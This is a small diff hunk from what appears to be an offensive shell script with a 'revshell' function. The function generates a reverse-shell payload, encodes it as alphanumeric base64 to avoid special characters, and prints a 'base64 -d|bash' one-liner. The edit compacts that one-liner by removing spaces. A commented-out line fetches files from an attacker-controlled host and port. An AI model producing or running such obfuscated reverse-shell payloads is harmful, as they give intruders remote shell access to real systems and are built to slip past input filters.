@@ -93,7 +93,7 @@ function revshell {
   # optimize base64 to contain no special chars
   echo "optimizing base 64..."
   alnumb64=$(~/kb/bash-scripting/find-alphanum-base64.sh "$bashshell" | head -n 1)
-  echo "echo $alnumb64 | base64 -d | bash"
+  echo "echo $alnumb64|base64 -d|bash"
 
   #downloadfiles "http://$lhost:$lport/filename.exe"
 
